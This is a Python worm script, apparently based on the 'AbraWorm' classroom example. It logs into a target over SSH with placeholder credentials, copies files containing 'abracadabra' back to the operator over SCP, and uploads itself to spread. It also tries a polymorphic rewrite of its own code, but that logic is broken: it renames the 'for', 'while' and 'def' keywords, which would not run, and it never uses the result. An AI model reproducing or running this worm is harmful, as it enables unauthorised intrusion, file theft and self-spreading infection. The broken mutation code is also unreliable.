import sys
import os
import random
import paramiko
import scp
import signal
import re
import shutil as sh

def sig_handler(signum, frame):
    os.kill(os.getpid(), signal.SIGKILL)

signal.signal(signal.SIGINT, sig_handler)

files_of_interest_at_target = []

def infect():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("<IP>", port=22, username="<usr>", password="<pass>", timeout=5)
    print("\n\nconnected\n")
    stdin, stdout, stderr = ssh.exec_command("cd <Dir>; ls")
    received_list = list(map(lambda x: str(x.strip()), stdout.readlines()))
    print("\n\noutput of 'ls' command: %s" % str(received_list))
    if "".join(received_list).find("AbraWorm") >= 0:
        print("\nThe target machine is already infected\n")
        return

    # Now let's look for files that contain the string 'abracadabra'
    cmd = "ls | grep abracadabra"
    stdin, stdout, stderr = ssh.exec_command(cmd)
    error = stderr.readlines()
    if error != []:
        print(error)
        # continue
    received_list = list(map(lambda x: x.encode("utf-8"), stdout.readlines()))
    # print(received_list)
    for item in received_list:
        files_of_interest_at_target.append(item.strip())
    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))

    # success till here
    scpcon = scp.SCPClient(ssh.get_transport())
    if len(files_of_interest_at_target) > 0:
        for target_file in files_of_interest_at_target:
            scpcon.get(target_file)

    print("Replicating Worm...")

    # Read contents of file into memory
    with open(sys.argv[0], "r") as f:
        contents = f.read()

    # Split contents into list of lines
    lines = contents.splitlines()

    # Define regex pattern to match loop and function definitions
    loop_pattern = r"^\s*(for|while)\s+.+:$"
    function_pattern = r"^\s*def\s+.+\(.*\)\s*:$"

    def modify_construct(match):
        # Choose random characters to use in the modified construct
        extra_chars = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=10))
        # Replace the loop or function name with the modified name
        return match.group(0).replace(match.group(1), match.group(1) + "_" + extra_chars)

    # Modify loop and function definitions in the code
    modified_code = ""
    for line in lines:
        if re.match(loop_pattern, line):
            line = re.sub(loop_pattern, modify_construct, line)
        elif re.match(function_pattern, line):
            line = re.sub(function_pattern, modify_construct, line)
        modified_code += line + "\n"

    scpcon.put("Abra.py", "<target>")
    scpcon.close()

infect()
